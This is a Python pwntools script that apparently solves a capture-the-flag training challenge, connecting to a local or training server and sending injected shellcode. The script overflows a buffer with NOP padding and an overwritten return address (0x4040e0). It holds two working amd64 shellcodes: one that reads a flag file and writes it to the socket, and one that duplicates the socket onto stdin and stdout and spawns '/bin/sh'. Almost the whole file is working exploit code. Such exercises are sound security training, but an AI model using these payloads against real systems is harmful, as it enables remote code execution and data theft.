from pwn import *
import sys
import time

context.arch = 'amd64'

server = process("./server")
if(len(sys.argv) > 1):
    if(sys.argv[1] == '--debug'):
        gdb.attach(server,
            """
                set follow-fork-mode child
                b *prog+133
		    """)
        input("wait...")
        p = remote("localhost", 2005)
    elif(sys.argv[1] == '--strace'):
        p = process(["strace", "./server"])
    elif(sys.argv[1] == '--remote'):
        p = remote("bin.training.offdef.it", 2005) # bin.training.offdef.it
else:
    p = remote("localhost", 2005)

owr = """
    mov r12, rdi
    mov rax, 0x101010101010101
    push rax
    mov rax, 0x101010101010101 ^ 0x67616c662f2e
    xor [rsp], rax
    mov rdi, rsp
    xor edx, edx /* 0 */
    xor esi, esi /* 0 */
    /* call open() */
    push SYS_open /* 2 */
    pop rax
    syscall
    /* call read(fd_open, 'rsp', 0x64) */
    push rax
    xor eax, eax /* SYS_read */
    pop rdi
    push 0x64
    pop rdx
    mov rsi, rsp
    syscall
    /* write(fd_socket, buf='rsp', n=0x64) */
    push r12
    pop rdi
    push 0x64
    pop rdx
    mov rsi, rsp
    /* call write() */
    push SYS_write /* 1 */
    pop rax
    syscall
"""

sh = """
xor rax, rax
mov rax, 0x21 /* dup2 */
mov rsi, 0x0
/* mov rdi, rdi <- the fd is already in rdi */
syscall
xor rax, rax
mov rax, 0x21 /* dup2 */
mov rsi, 0x1
/* mov rdi, rdi <- the fd is already in rdi */
syscall
mov rsi, 0
mov rdx, 0
lea rdi, [rip]
add rdi, 13
mov rax, 0x3b
syscall
.string "/bin/sh"
"""

#shellcode = asm(owr)
shellcode = asm(sh)

p.sendline(shellcode + b'\x90'*(1016-len(shellcode)) + p64(0x4040e0))

p.interactive()

server.close()